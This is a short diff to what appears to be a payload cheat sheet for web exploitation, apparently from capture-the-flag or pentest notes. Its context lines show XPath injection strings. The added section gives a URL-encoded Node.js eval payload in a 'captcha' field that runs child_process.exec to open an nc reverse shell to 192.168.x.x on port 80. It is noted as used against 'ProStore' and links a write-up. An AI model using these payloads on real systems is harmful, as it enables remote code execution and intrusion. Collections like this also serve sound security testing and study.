@@ -92,3 +92,13 @@ XPATH Injection (XML data)
 ') or 1=1 or ('
 ')] | //password%00
 ```
+
+Used in `ProStore`
+
+Node.js
+
+https://medium.com/r3d-buck3t/eval-console-log-rce-warning-be68e92c3090
+
+```
+captcha=require('child_process').exec('rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20192.168.x.x%2080%20%3E%2Ftmp%2Ff')
+```
